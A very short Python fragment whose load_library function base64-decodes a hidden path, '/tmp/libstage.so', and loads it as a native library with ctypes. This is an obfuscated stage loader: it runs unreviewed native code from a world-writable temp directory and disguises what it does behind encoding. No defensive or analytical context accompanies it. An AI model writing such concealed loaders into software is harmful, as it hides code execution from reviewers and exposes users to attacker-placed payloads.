import base64
import ctypes


def load_library():
    encoded_path = "L3RtcC9saWJzdGFnZS5zbw=="
    ctypes.CDLL(base64.b64decode(encoded_path).decode())

